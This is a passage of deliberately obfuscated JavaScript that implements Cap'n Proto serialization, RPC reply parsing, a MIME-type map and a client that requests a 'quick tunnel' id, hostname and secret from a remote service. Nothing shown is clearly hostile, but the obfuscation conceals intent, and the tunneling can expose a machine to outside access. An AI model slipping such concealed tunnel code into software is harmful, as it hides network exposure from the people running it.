            }, f = d[fh(0x753)](0xffffffffn, d[fh(0x41e)](BigInt, d[fh(0x42e)](b, 0x8)));
        this[fh(0x7f6)][a] = d['QanAy'](this[fh(0x7f6)][a], ~f) | d['PDVJo'](d[fh(0x53a)](BigInt, d[fh(0x360)](c, 0xffffffff)), BigInt(d[fh(0xb97)](b, 0x8)));
    }
    [a0c4(0x72f)](a, b) {
        const fi = a0c4, c = {
                'JoKpF': function (d, f) {
                    return d(f);
                }
            };
        this['words'][a] = c[fi(0x33c)](BigInt, b) & 0xffffffffffffffffn;
    }
    [a0c4(0x277)](a, b, c = ![]) {
        const fj = a0c4, d = {
                'iSNhb': function (m, n) {
                    return m === n;
                },
                'Hootx': fj(0x36e),
                'SJYCJ': fj(0x1bc),
                'EScEt': function (m, n) {
                    return m + n;
                },
                'qicQz': function (m, n) {
                    return m / n;
                },
                'Dxwbr': function (m, n) {
                    return m % n;
                },
                'VOoTu': function (m, n) {
                    return m - n;
                },
                'Zgdyy': function (m, n) {
                    return m - n;
                },
                'bkmRi': function (m, n) {
                    return m & n;
                },
                'xKiPb': function (m, n) {
                    return m | n;
                },
                'dLuPF': function (m, n) {
                    return m(n);
                },
                'qzwQy': function (m, n) {
                    return m << n;
                },
                'AAeFG': function (m, n) {
                    return m(n);
                },
                'bPNgK': function (m, n) {
                    return m << n;
                }
            }, f = d[fj(0x988)](typeof b, d['Hootx']) ? Buffer[fj(0x581)](b, d[fj(0x449)]) : b, g = d['EScEt'](f[fj(0xcfc)], c ? 0x1 : 0x0), h = this[fj(0x9b5)](Math[fj(0x44f)](d[fj(0x57f)](g, 0x8)));
        for (let m = 0x0; m < f[fj(0xcfc)]; m++) {
            this[fj(0x7ef)](h + Math[fj(0x5c2)](d[fj(0x57f)](m, 0x8)), d[fj(0x649)](m, 0x8), f[m]);
        }
        const j = d[fj(0xaae)](d['Zgdyy'](h, a), 0x1), k = d[fj(0x6da)](d['xKiPb'](d[fj(0x5a4)](BigInt, j) << 0x2n, 0x1n), 0xffffffffn), l = d[fj(0x810)](0x2n, d['qzwQy'](d[fj(0x9f3)](BigInt, g & 0x1fffffff), 0x3n));
        this[fj(0x7f6)][a] = d[fj(0x810)](k, d[fj(0xa0e)](l, 0x20n));
    }
    [a0c4(0x579)](a, b) {
        const fk = a0c4, c = {
                'uQdln': function (g, h) {
                    return g - h;
                },
                'cVrIf': function (g, h) {
                    return g | h;
                },
                'lKmQZ': function (g, h) {
                    return g & h;
                },
                'GVJNC': function (g, h) {
                    return g | h;
                },
                'tmCXd': function (g, h) {
                    return g << h;
                },
                'mQQvM': function (g, h) {
                    return g << h;
                },
                'IaTYX': function (g, h) {
                    return g(h);
                },
                'ZYHnf': function (g, h) {
                    return g + h;
                }
            };
        if (!b['length']) {
            this[fk(0x7f6)][a] = 0x0n;
            return;
        }
        const d = this[fk(0x9b5)](b['length']), f = c[fk(0x58e)](c['uQdln'](d, a), 0x1);
        this[fk(0x7f6)][a] = c[fk(0x423)](c[fk(0x1ca)](c['GVJNC'](c[fk(0x4c4)](BigInt(f), 0x2n), 0x1n), 0xffffffffn), c['tmCXd'](0x6n | c[fk(0x9c3)](c[fk(0x3a9)](BigInt, b[fk(0xcfc)]), 0x3n), 0x20n));
        for (let g = 0x0; g < b[fk(0xcfc)]; g++) {
            this[fk(0x277)](c['ZYHnf'](d, g), b[g], !![]);
        }
    }
    ['writeStructList'](a, b, c, d, f) {
        const fl = a0c4, g = {
                'qPCjg': function (m, n) {
                    return m + n;
                },
                'bojZk': function (m, n) {
                    return m * n;
                },
                'eDsWz': function (m, n) {
                    return m - n;
                },
                'bvOIE': function (m, n) {
                    return m - n;
                },
                'KVkbv': function (m, n) {
                    return m | n;
                },
                'LKrdC': function (m, n) {
                    return m & n;
                },
                'Eqbbd': function (m, n) {
                    return m << n;
                },
                'IxKpC': function (m, n) {
                    return m(n);
                },
                'cMQhi': function (m, n) {
                    return m << n;
                },
                'FWQvN': function (m, n) {
                    return m(n);
                },
                'IdiTq': function (m, n) {
                    return m << n;
                },
                'QinCS': function (m, n) {
                    return m(n);
                },
                'qydJD': function (m, n) {
                    return m << n;
                },
                'JdZJz': function (m, n) {
                    return m < n;
                }
            }, h = this['alloc'](0x1), j = g[fl(0x69d)](c, d), k = this['alloc'](g[fl(0xc16)](b, j)), l = g['eDsWz'](g['bvOIE'](h, a), 0x1);
        this['words'][a] = g['KVkbv'](g[fl(0x1f8)](g['KVkbv'](g[fl(0x34b)](g[fl(0xc94)](BigInt, l), 0x2n), 0x1n), 0xffffffffn), g[fl(0x34b)](g[fl(0x3f0)](g[fl(0x775)](g[fl(0x42d)](BigInt, b) * BigInt(j), 0x3n), 0x7n), 0x20n)), this[fl(0x7f6)][h] = g[fl(0x3f0)](g['IdiTq'](g['QinCS'](BigInt, b), 0x2n) | g[fl(0x34b)](BigInt(c), 0x20n), g[fl(0xd55)](BigInt(d), 0x30n));
        for (let m = 0x0; g[fl(0xb18)](m, b); m++) {
            f(m, k + m * j);
        }
    }
    ['finish']() {
        const fm = a0c4, a = {
                'plZGe': function (d, f) {
                    return d * f;
                },
                'DnMtJ': function (d, f) {
                    return d < f;
                }
            }, b = Buffer[fm(0x9b5)](0x8);
        b[fm(0x803)](0x0, 0x0), b[fm(0x803)](this[fm(0x7f6)][fm(0xcfc)], 0x4);
        const c = Buffer[fm(0x9b5)](a[fm(0xb31)](this['words'][fm(0xcfc)], 0x8));
        for (let d = 0x0; a[fm(0xb24)](d, this[fm(0x7f6)]['length']); d++) {
            c[fm(0x344)](this['words'][d] & 0xffffffffffffffffn, a[fm(0xb31)](d, 0x8));
        }
        return Buffer['concat']([
            b,
            c
        ]);
    }
}
function a0aq(a) {
    const fn = a0c4, b = new a0ap(), c = b['alloc'](0x1), d = b[fn(0x9b5)](0x1), f = b[fn(0x9b5)](0x1);
    b[fn(0xad5)](c, d, 0x1, 0x1), b[fn(0x4e0)](d, 0x0, 0x8);
    const g = b[fn(0x9b5)](0x1);
    return b[fn(0x9b5)](0x1), b[fn(0xad5)](f, g, 0x1, 0x1), b['setU32'](g, 0x0, a), b['finish']();
}
function a0ar(a, b, c, d, f, g) {
    const fo = a0c4, h = {
            'wQcRA': function (H, I) {
                return H | I;
            },
            'vIEBI': function (H, I) {
                return H & I;
            },
            'zrjBs': 'serialized_headers',
            'MdaiL': fo(0x1df),
            'zKaPZ': fo(0x9e7),
            'oRfmU': fo(0xb9e)
        }, i = new a0ap(), j = i[fo(0x9b5)](0x1), k = i[fo(0x9b5)](0x1), l = i[fo(0x9b5)](0x1);
    i[fo(0xad5)](j, k, 0x1, 0x1), i[fo(0x4e0)](k, 0x0, 0x2);
    const m = i['alloc'](0x1), n = i['alloc'](0x1);
    i['alloc'](0x1);
    const o = i[fo(0x9b5)](0x1), p = i[fo(0x9b5)](0x1);
    i[fo(0x9b5)](0x1), i[fo(0xad5)](l, m, 0x3, 0x3), i[fo(0x470)](m, 0x0, a), i[fo(0x72f)](n, 0xf71695ec7fe85497n);
    const q = i[fo(0x9b5)](0x1), r = i['alloc'](0x1);
    i[fo(0xad5)](o, q, 0x1, 0x1), i[fo(0x4e0)](q, 0x4, 0x1);
    const s = i[fo(0x9b5)](0x1);
    i[fo(0x9b5)](0x1), i[fo(0xad5)](r, s, 0x1, 0x1), i[fo(0x470)](s, 0x0, b);
    const t = i[fo(0x9b5)](0x1);
    i[fo(0x9b5)](0x1), i['structPtr'](p, t, 0x0, 0x2);
    const u = i['alloc'](0x1), v = i[fo(0x9b5)](0x1), w = i[fo(0x9b5)](0x1), x = i[fo(0x9b5)](0x1);
    i[fo(0xad5)](t, u, 0x1, 0x3), i[fo(0x7ef)](u, 0x0, g);
    const y = i[fo(0x9b5)](0x1), z = i['alloc'](0x1);
    i[fo(0xad5)](v, y, 0x0, 0x2), i['writeBytes'](y, c, !![]), i[fo(0x277)](z, d), i[fo(0x277)](w, f);
    const A = i[fo(0x9b5)](0x1), B = i[fo(0x9b5)](0x1);
    i['alloc'](0x1), i['structPtr'](x, A, 0x1, 0x2);
    const C = i[fo(0x9b5)](0x1), D = i[fo(0x9b5)](0x1), E = i['alloc'](0x1), F = i['alloc'](0x1);
    i['structPtr'](B, C, 0x0, 0x4);
    const G = a0k['randomBytes'](0x10);
    return G[0x6] = h['wQcRA'](h['vIEBI'](G[0x6], 0xf), 0x40), G[0x8] = h[fo(0x4d5)](G[0x8] & 0x3f, 0x80), i[fo(0x277)](C, G), i['writeTextList'](D, [
        h[fo(0x8c0)],
        h[fo(0xa52)]
    ]), i[fo(0x277)](E, h[fo(0x36d)], !![]), i['writeBytes'](F, h[fo(0x9c8)], !![]), i[fo(0x614)]();
}
function a0as(a) {
    const fp = a0c4, b = {
            'dwKPp': function (f, g) {
                return f >= g;
            },
            'mQGQI': function (f, g) {
                return f - g;
            },
            'gYucp': function (f, g) {
                return f + g;
            },
            'KXxSp': function (f, g) {
                return f - g;
            },
            'ljFJd': function (f, g) {
                return f < g;
            },
            'RoRat': function (f, g) {
                return f + g;
            },
            'eWTLh': function (f, g) {
                return f * g;
            },
            'JCvat': function (f, g) {
                return f * g;
            },
            'GBKoy': function (f, g) {
                return f < g;
            },
            'cspmn': function (f, g) {
                return f !== g;
            },
            'BVbBE': fp(0x3a2),
            'WOjrA': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b['dwKPp'](b['mQGQI'](a[fp(0xcfc)], d), 0x8)) {
        const f = a[fp(0xb4d)](d), g = a['readUInt32LE'](d + 0x4), h = f + 0x1;
        let j = b[fp(0x90a)](h, 0x1), k = j * 0x4;
        k % 0x8 && (k += 0x4);
        if (b[fp(0x538)](a[fp(0xcfc)], d) < k)
            break;
        const l = [g];
        for (let n = 0x1; b[fp(0x2fc)](n, h); n++) {
            l[fp(0x21f)](a['readUInt32LE'](b[fp(0x1fe)](d + 0x4, b[fp(0x92b)](n, 0x4))));
        }
        const m = b[fp(0x1fe)](k, b[fp(0x260)](l['reduce']((o, p) => o + p, 0x0), 0x8));
        if (b[fp(0x47d)](b[fp(0x8ea)](a[fp(0xcfc)], d), m))
            break;
        if (b[fp(0x5ef)](h, 0x1))
            throw new Error(b[fp(0xd38)]);
        c[fp(0x21f)](a[fp(0xd15)](d + k, b[fp(0x7cc)](d, m))), d += m;
    }
    return [
        c,
        a['subarray'](d)
    ];
}
function a0at(a, b) {
    const fq = a0c4, c = {
            'uwLSm': function (j, k) {
                return j >= k;
            },
            'TosKb': fq(0xcf8),
            'HCZLe': function (j, k) {
                return j & k;
            },
            'QRKYH': 'expected\x20Cap\x27n\x20Proto\x20struct\x20pointer',
            'CCzzn': function (j, k) {
                return j >> k;
            },
            'vgpYf': function (j, k) {
                return j + k;
            },
            'rNlrF': function (j, k) {
                return j(k);
            },
            'FGqtG': function (j, k) {
                return j(k);
            },
            'HCffd': function (j, k) {
                return j & k;
            },
            'zMzSI': function (j, k) {
                return j < k;
            },
            'LmXTM': function (j, k) {
                return j > k;
            },
            'tGCoI': function (j, k) {
                return j + k;
            }
        };
    if (c['uwLSm'](b, a[fq(0xcfc)]))
        throw new Error(c['TosKb']);
    const d = a[b];
    if (c[fq(0x9b3)](d, 0x3n) !== 0x0n)
        throw new Error(c[fq(0xcd6)]);
    let f = c['HCZLe'](c[fq(0x51d)](d, 0x2n), 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c[fq(0x28c)](b + 0x1, c['rNlrF'](Number, f)), h = Number(c[fq(0x9b3)](d >> 0x20n, 0xffffn)), i = c[fq(0x804)](Number, c[fq(0xaa7)](d >> 0x30n, 0xffffn));
    if (c[fq(0x3fe)](g, 0x0) || c[fq(0x91c)](c['tGCoI'](g, h) + i, a['length']))
        throw new Error(fq(0xcf8));
    return [
        g,
        h,
        i
    ];
}
function a0au(a) {
    const fr = a0c4, b = {
            'UoAcG': function (d, f) {
                return d <= f;
            },
            'rheOc': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[fr(0x79f)](b[fr(0x984)](d, 0x8), a[fr(0xcfc)]); d += 0x8) {
        c[fr(0x21f)](a[fr(0x9b7)](d));
    }
    return c;
}
function a0av(a, b) {
    const ft = a0c4, c = {
            'uUFbl': function (p, q) {
                return p !== q;
            },
            'LLUlb': function (p, q) {
                return p & q;
            },
            'RFTjh': function (p, q) {
                return p & q;
            },
            'YhAjG': function (p, q) {
                return p >> q;
            },
            'Uqjbw': function (p, q) {
                return p & q;
            },
            'XZRoX': function (p, q) {
                return p + q;
            },
            'LyUnh': function (p, q) {
                return p + q;
            },
            'sTLQr': function (p, q) {
                return p(q);
            },
            'OWzsp': function (p, q) {
                return p < q;
            },
            'YqpBB': function (p, q) {
                return p !== q;
            },
            'JXHBJ': function (p, q) {
                return p(q);
            },
            'qpsIS': function (p, q) {
                return p >> q;
            },
            'zRUPA': function (p, q) {
                return p & q;
            },
            'BOght': function (p, q) {
                return p >> q;
            },
            'MTGSM': function (p, q) {
                return p(q);
            },
            'jsQql': function (p, q) {
                return p & q;
            },
            'Rmgsz': function (p, q) {
                return p < q;
            },
            'woQkM': function (p, q) {
                return p === q;
            },
            'kWUeV': function (p, q) {
                return p !== q;
            },
            'HFvhf': function (p, q) {
                return p * q;
            },
            'tBjTt': function (p, q) {
                return p + q;
            },
            'IgkRT': function (p, q) {
                return p + q;
            },
            'WZSJH': function (p, q) {
                return p < q;
            },
            'nlJCZ': function (p, q) {
                return p + q;
            },
            'YfZLb': function (p, q, r) {
                return p(q, r);
            }
        };
    if (b >= a[ft(0xcfc)])
        return null;
    const d = a[b];
    if (c['uUFbl'](d & 0x3n, 0x1n) || c[ft(0x566)](c[ft(0xb8e)](d >> 0x20n, 0x7n), 0x7n))
        return null;
    let f = c['RFTjh'](c['YhAjG'](d, 0x2n), 0x3fffffffn);
    c[ft(0xd61)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[ft(0xdbe)](c['LyUnh'](b, 0x1), c[ft(0xb4e)](Number, f)), h = c[ft(0xb4e)](Number, d >> 0x23n);
    if (c[ft(0x83d)](g, 0x0) || g >= a[ft(0xcfc)])
        return null;
    const j = a[g];
    if (c[ft(0xac9)](j & 0x3n, 0x0n))
        return null;
    const k = c['JXHBJ'](Number, c[ft(0x4ce)](j, 0x20n) & 0xffffn), l = c[ft(0x7f9)](Number, c[ft(0x3e6)](c[ft(0x1a9)](j, 0x30n), 0xffffn)), m = c[ft(0x6dc)](Number, c['jsQql'](c[ft(0x4ce)](j, 0x2n), 0x3fffffffn)), n = k + l;
    if (c[ft(0x41f)](l, 0x2) || c[ft(0x41a)](n, 0x0) || c[ft(0xa97)](c[ft(0x8bc)](n, m), h))
        return null;
    if (c[ft(0xc57)](c[ft(0x94b)](g, 0x1), c[ft(0x8bc)](n, m)) > a[ft(0xcfc)])
        return null;
    const o = [];
    for (let p = 0x0; c[ft(0xa6c)](p, m); p++) {
        const q = c[ft(0x94b)](c[ft(0x619)](g, 0x1), c[ft(0x8bc)](p, n));
        o[ft(0x21f)]([
            c['YfZLb'](a0aw, a, c['nlJCZ'](q, k)),
            c[ft(0x524)](a0aw, a, c[ft(0x94b)](q, k) + 0x1)
        ]);
    }
    return o;
}
function a0aw(a, b) {
    const fu = a0c4, c = {
            'cWKtz': function (m, n) {
                return m >= n;
            },
            'pAImK': function (m, n) {
                return m !== n;
            },
            'yJxWn': function (m, n) {
                return m & n;
            },
            'ctVrY': function (m, n) {
                return m & n;
            },
            'TGASm': function (m, n) {
                return m + n;
            },
            'sNWfu': function (m, n) {
                return m(n);
            },
            'cSOjv': function (m, n) {
                return m & n;
            },
            'inECv': function (m, n) {
                return m / n;
            },
            'hpFyS': function (m, n) {
                return m !== n;
            },
            'CHAMf': function (m, n) {
                return m > n;
            },
            'kdwhV': function (m, n) {
                return m * n;
            },
            'jXLiw': function (m, n) {
                return m < n;
            },
            'QQoDv': function (m, n) {
                return m & n;
            },
            'GYrej': 'utf8'
        };
    if (c[fu(0xdc5)](b, a[fu(0xcfc)]))
        return '';
    const d = a[b];
    if (c['pAImK'](c[fu(0x3d4)](d, 0x3n), 0x1n))
        return '';
    let f = d >> 0x2n & 0x3fffffffn;
    c[fu(0x4c2)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[fu(0x8a2)](b, 0x1) + c['sNWfu'](Number, f), h = c[fu(0x691)](Number, c['cSOjv'](d >> 0x20n, 0x7n)), j = c['sNWfu'](Number, d >> 0x23n), k = Math[fu(0x44f)](c[fu(0x998)](j, 0x8));
    if (c['hpFyS'](h, 0x2) || g < 0x0 || c[fu(0x572)](c[fu(0x8a2)](g, k), a[fu(0xcfc)]))
        return '';
    const l = Buffer[fu(0x9b5)](c[fu(0x4ef)](k, 0x8));
    for (let m = 0x0; c[fu(0xd87)](m, k); m++) {
        l[fu(0x344)](c[fu(0x765)](a[g + m], 0xffffffffffffffffn), c[fu(0x4ef)](m, 0x8));
    }
    return l[fu(0xd15)](0x0, j)[fu(0xa3c)](c[fu(0x8a9)])['replace'](/\0+$/, '');
}
function a0ax(a) {
    const fv = a0c4, b = {
            'joFEC': function (u, v) {
                return u % v;
            },
            'ATsHf': function (u, v) {
                return u < v;
            },
            'qamfd': function (u, v) {
                return u(v);
            },
            'UJrCs': function (u, v, w) {
                return u(v, w);
            },
            'jMoFD': function (u, v) {
                return u !== v;
            },
            'rgXJH': function (u, v) {
                return u & v;
            },
            'cGnpG': 'not\x20an\x20RPC\x20return\x20message',
            'IKnMN': function (u, v) {
                return u(v);
            },
            'KSaDF': function (u, v) {
                return u === v;
            },
            'uVJNx': function (u, v, w) {
                return u(v, w);
            },
            'KwYKm': function (u, v) {
                return u + v;
            },
            'Czasj': function (u, v, w) {
                return u(v, w);
            },
            'ugWGR': fv(0xcf6),
            'sRdtq': 'RPC\x20return\x20union\x20',
            'kRval': function (u, v) {
                return u + v;
            },
            'eTpXd': function (u, v) {
                return u === v;
            },
            'Nfmch': function (u, v) {
                return u + v;
            },
            'MhoPo': function (u, v) {
                return u === v;
            },
            'QrbFj': function (u, v) {
                return u > v;
            },
            'XmkbZ': function (u, v) {
                return u & v;
            },
            'zgTJt': function (u, v) {
                return u === v;
            },
            'qywlV': function (u, v) {
                return u + v;
            },
            'IKvhm': function (u, v, w) {
                return u(v, w);
            },
            'qwnjn': function (u, v) {
                return u + v;
            },
            'znVki': function (u, v) {
                return u + v;
            },
            'RcDqZ': function (u, v) {
                return u || v;
            }
        };
    if (b['joFEC'](a[fv(0xcfc)], 0x8) || b[fv(0xc1f)](a[fv(0xcfc)], 0x10))
        throw new Error(fv(0xbbf));
    const c = b['qamfd'](a0au, a);
    let d, f, g;
    [d, f, g] = b['UJrCs'](a0at, c, 0x0);
    if (b['ATsHf'](f, 0x1) || b[fv(0x768)](b[fv(0x839)](c[d], 0xffffn), 0x3n))
        throw new Error(b[fv(0x856)]);
    const [h, i, j] = b[fv(0xc7a)](a0at, c, d + f), k = b[fv(0x851)](Number, b[fv(0x839)](c[h] >> 0x30n, 0xffffn));
    if (b[fv(0xb93)](k, 0x4)) {
        const [u, v] = b[fv(0x2aa)](a0at, c, b[fv(0x3e2)](h, i));
        return {
            'ok': ![],
            'error': b[fv(0xaa2)](a0aw, c, u + v) || b['ugWGR']
        };
    }
    if (b['jMoFD'](k, 0x0))
        return {
            'ok': ![],
            'error': b[fv(0x3e2)](b[fv(0xad6)], k)
        };
    const [l, m, n] = a0at(c, b[fv(0x3e2)](h, i));
    if (!n)
        return {
            'ok': ![],
            'error': fv(0x43c)
        };
    const o = c[b['kRval'](l, m)];
    if (b[fv(0x8e7)](b[fv(0x839)](o, 0x3n), 0x3n))
        return {
            'ok': ![],
            'bootstrap': !![]
        };
    let p, q, r;
    [p, q, r] = a0at(c, b['Nfmch'](l, m));
    b[fv(0x784)](q, 0x0) && b[fv(0x784)](r, 0x1) && ([p, q, r] = b[fv(0x2aa)](a0at, c, b[fv(0x508)](p, q)));
    const s = b[fv(0xa2f)](q, 0x0) ? Number(b[fv(0xbbe)](c[p], 0xffffn)) : 0x0;
    if (b['zgTJt'](s, 0x1)) {
        const [w, x] = b[fv(0xaa2)](a0at, c, b[fv(0xb6a)](p, q)), y = b[fv(0xd67)](a0aw, c, b['qwnjn'](b['znVki'](w, x), 0x1));
        return {
            'ok': !![],
            'location': y
        };
    }
    const t = b[fv(0xc7a)](a0aw, c, p + q);
    return {
        'ok': ![],
        'error': b[fv(0x253)](t, b[fv(0x7f0)])
    };
}
function a0ay(a) {
    const fw = a0c4, b = {
            'DFvmO': function (h, i) {
                return h(i);
            },
            'uXnAL': fw(0xadb),
            'EdhlO': function (h, i, j) {
                return h(i, j);
            },
            'MrppS': function (h, i) {
                return h < i;
            },
            'xHfFK': function (h, i) {
                return h < i;
            },
            'nWMYJ': function (h, i, j) {
                return h(i, j);
            },
            'gMdRM': function (h, i) {
                return h + i;
            },
            'VaVJa': function (h, i) {
                return h & i;
            },
            'ODBMa': function (h, i, j) {
                return h(i, j);
            },
            'QUwOc': function (h, i) {
                return h + i;
            }
        }, c = b[fw(0x971)](a0au, a);
    if (!c['length'])
        throw new Error(b[fw(0x861)]);
    let d, f, g;
    [d, f, g] = b[fw(0x98a)](a0at, c, 0x0);
    if (b['MrppS'](f, 0x1) || b[fw(0x90b)](g, 0x2))
        throw new Error(fw(0xc56));
    return {
        'dest': b['nWMYJ'](a0aw, c, b['gMdRM'](d, f)),
        'type': Number(b[fw(0x5fe)](c[d], 0xffffn)),
        'metadata': b[fw(0x1ae)](a0av, c, b['QUwOc'](d, f) + 0x1) || []
    };
}
function a0az(a, b) {
    const fx = a0c4, c = {
            'HdOyC': function (h, i) {
                return h + i;
            },
            'GZZyV': function (h, i) {
                return h || i;
            }
        }, d = new a0ap(), f = d['alloc'](0x1), g = d[fx(0x9b5)](0x2);
    return d[fx(0xad5)](f, g, 0x0, 0x2), d[fx(0x277)](g, c[fx(0xb10)](a, ''), !![]), d['writeStructList'](c[fx(0xcf3)](g, 0x1), b['length'], 0x0, 0x2, (h, i) => {
        const fy = fx;
        d[fy(0x277)](i, b[h][0x0], !![]), d['writeBytes'](c['HdOyC'](i, 0x1), b[h][0x1], !![]);
    }), d['finish']();
}
const a0aA = {
    '.js': a0c4(0x679),
    '.mjs': 'text/javascript;\x20charset=utf-8',
    '.css': a0c4(0x267),
    '.json': 'application/json;\x20charset=utf-8',
    '.map': a0c4(0x6c7),
    '.wasm': a0c4(0xa46),
    '.html': 'text/html;\x20charset=utf-8',
    '.htm': a0c4(0x434),
    '.svg': 'image/svg+xml',
    '.xml': 'application/xml',
    '.woff': 'font/woff2',
    '.woff2': a0c4(0x19f),
    '.png': 'image/png',
    '.jpg': a0c4(0x3a7),
    '.jpeg': a0c4(0x3a7),
    '.gif': a0c4(0x870),
    '.ico': a0c4(0x28d)
};
function a0aB(a) {
    const fz = a0c4, b = {
            'iAJxH': function (f, g) {
                return f < g;
            }
        }, c = a[fz(0xd23)]('/') ? a[fz(0xa40)](0x0, -0x1) : a, d = c[fz(0x366)]('.');
    if (b[fz(0xcbc)](d, 0x0))
        return '';
    return a0aA[c[fz(0xa40)](d)[fz(0xc48)]()] || '';
}
function a0aC(a) {
    const fA = a0c4, b = {
            'VdCwe': function (c, d) {
                return c !== d;
            },
            'hqluL': fA(0x36e),
            'VLRvC': function (c, d) {
                return c + d;
            },
            'vNDxi': function (c, d) {
                return c % d;
            }
        };
    if (Array[fA(0xb8b)](a))
        return Buffer[fA(0x581)](a);
    if (b['VdCwe'](typeof a, b[fA(0x913)]))
        throw new Error(fA(0x3c2));
    return Buffer[fA(0x581)](b[fA(0xb62)](a, '='[fA(0xa61)](b[fA(0xd0d)](-a[fA(0xcfc)], 0x4))), fA(0x7be));
}
const a0aD = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0aE(a) {
    const fB = a0c4, b = {
            'YUPDc': fB(0x1bc),
            'wTBeZ': function (c, d) {
                return c(d);
            },
            'micWY': function (c, d) {
                return c + d;
            },
            'CEuua': function (c, d) {
                return c + d;
            },
            'LINyP': fB(0x657),
            'sAnzK': fB(0x36e),
            'TbwUS': function (c, d) {
                return c !== d;
            },
            'Diqmr': fB(0xd47),
            'dscPd': 'data',
            'ICLwN': fB(0xbb0),
            'OLBOO': fB(0xb3a),
            'ptJAz': function (c, d) {
                return c + d;
            },
            'hssgT': 'requesting\x20quick\x20tunnel\x20failed:\x20',
            'nZDge': function (c, d) {
                return c === d;
            },
            'vydvI': fB(0x440),
            'FeEDb': fB(0x453)
        };
    return new Promise((c, d) => {
        const fC = fB, f = {
                'Zmetj': b[fC(0xc0f)],
                'AfrvL': function (j, k) {
                    const fD = fC;
                    return b[fD(0xa4d)](j, k);
                },
                'qsjKN': function (j, k) {
                    const fE = fC;
                    return b[fE(0x6dd)](j, k);
                },
                'ElhCy': function (j, k) {
                    const fF = fC;
                    return b[fF(0x6cc)](j, k);
                },
                'Eqpyf': b[fC(0x8d7)],
                'zklze': b[fC(0x8b2)],
                'FwSZk': function (j, k) {
                    const fG = fC;
                    return b[fG(0x377)](j, k);
                },
                'zAxcs': function (j, k) {
                    return j(k);
                },
                'xRgzO': b[fC(0xa05)],
                'YwMUq': b[fC(0x2a9)],
                'FLFDz': b[fC(0xba1)],
                'lFgMS': b[fC(0x6e2)]
            };
        let g;
        try {
            g = new URL(a[fC(0x1ad)](/\/+$/, '') + '/tunnel');
        } catch (j) {
            b[fC(0xa4d)](d, new Error(b[fC(0x648)](b[fC(0x8f9)], j[fC(0x1f1)])));
            return;
        }
        const h = b[fC(0x676)](g['protocol'], fC(0xb3c)) ? a0h : a0g, i = h[fC(0x98b)](g, {
                'method': b['vydvI'],
                'headers': {
                    'Content-Type': 'application/json',
                    'User-Agent': b['FeEDb']
                },
                'timeout': 0x3a98
            }, k => {
                const fH = fC, l = {
                        'PvTyJ': f[fH(0x1fd)],
                        'HkDXw': function (n, o) {
                            const fI = fH;
                            return f[fI(0x40a)](n, o);
                        },
                        'EOETh': function (n, o) {
                            const fJ = fH;
                            return f[fJ(0x73c)](n, o);
                        },
                        'xYPnl': function (n, o) {
                            return f['ElhCy'](n, o);
                        },
                        'pEylC': f[fH(0xc8d)],
                        'YyMOs': function (n, o) {
                            return n(o);
                        },
                        'KjmFE': f[fH(0x52d)],
                        'RSqPg': function (n, o) {
                            const fK = fH;
                            return f[fK(0x8b6)](n, o);
                        },
                        'yTGhr': function (n, o) {
                            const fL = fH;
                            return f[fL(0x8cf)](n, o);
                        },
                        'OJyFM': f[fH(0x4f5)],
                        'ySQNs': fH(0xafb)
                    }, m = [];
                k['on'](f[fH(0xc73)], n => m[fH(0x21f)](n)), k['on'](f['FLFDz'], d), k['on'](f[fH(0x2f8)], () => {
                    const fM = fH, n = Buffer[fM(0x6ef)](m), o = k[fM(0x5b8)];
                    let p;
                    try {
                        p = JSON[fM(0xcf1)](n['toString'](l['PvTyJ']));
                    } catch (r) {
                        l[fM(0xbaa)](d, new Error(l[fM(0x900)](l[fM(0xa21)](l[fM(0xa21)](l[fM(0x431)], o), fM(0x438)), n[fM(0xd15)](0x0, 0x12c)[fM(0xa3c)](fM(0x1bc)))));
                        return;
                    }
                    const q = p[fM(0xa5f)] || {};
                    if (!(p['success'] ?? !![]) || !q) {
                        d(new Error(fM(0x222) + JSON[fM(0x8f7)](p[fM(0x924)])));
                        return;
                    }
                    try {
                        const s = l[fM(0x1eb)](String, q['id']);
                        if (!a0aD['test'](s))
                            throw new Error('bad\x20tunnel\x20id');
                        if (typeof q[fM(0x962)] !== l[fM(0x456)] || l[fM(0xccd)](typeof q['hostname'], fM(0x36e)))
                            throw new Error('bad\x20account\x20tag\x20or\x20hostname');
                        const t = l['yTGhr'](a0aC, q[fM(0xb83)]), u = Buffer[fM(0x581)](s[fM(0x1ad)](/-/g, ''), l[fM(0x78c)]);
                        c([
                            q[fM(0x3cc)],
                            q[fM(0x962)],
                            t,
                            u
                        ]);
                    } catch (v) {
                        d(new Error(l['xYPnl'](l[fM(0x774)], v[fM(0x1f1)])));
                    }
                });
            });
        i['on'](fC(0xbb0), k => d(new Error(fC(0x1ea) + k['message']))), i[fC(0xb3a)]();
    });
}
function a0aF(a) {
    const fN = a0c4;
    return a['map'](([b, c]) => Buffer[fN(0x581)](b, 'utf8')['toString'](fN(0x7be))['replace'](/=+$/, '') + ':' + Buffer[fN(0x581)](c, 'utf8')['toString'](fN(0x7be))[fN(0x1ad)](/=+$/, ''))[fN(0x6e5)](';');
}
class a0aG {
    constructor(a) {
        const fO = a0c4, b = {
                'MHtsa': fO(0x280),
                'JEPxQ': 'end',
                'QZLFe': fO(0xd8e),
                'rDcvx': fO(0xbb0),
                'hSZou': fO(0x369)
            }, c = b[fO(0x969)][fO(0x3ff)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this['buffer'] = Buffer[fO(0x9b5)](0x0);
                continue;
            case '1':
                a['on'](b[fO(0x412)], () => {
                    const fP = fO;
                    this[fP(0x443)] = !![], this[fP(0x1a4)]();
                });
                continue;
            case '2':
                this[fO(0x999)] = null;
                continue;
            case '3':
                this[fO(0x443)] = ![];
                continue;
            case '4':
                this[fO(0x376)] = [];
                continue;
            case '5':
                this[fO(0x855)] = a;
                continue;
            case '6':
                a['on'](b[fO(0x2f7)], () => {
                    const fQ = fO;
                    this[fQ(0x443)] = !![], this['_drain']();
                });
                continue;
            case '7':
                a['on'](b[fO(0x4a3)], f => {
                    const fR = fO;
                    this[fR(0x999)] = f, this[fR(0x1a4)]();
                });
                continue;
            case '8':
                a['on'](b[fO(0xced)], f => {
                    const fS = fO;
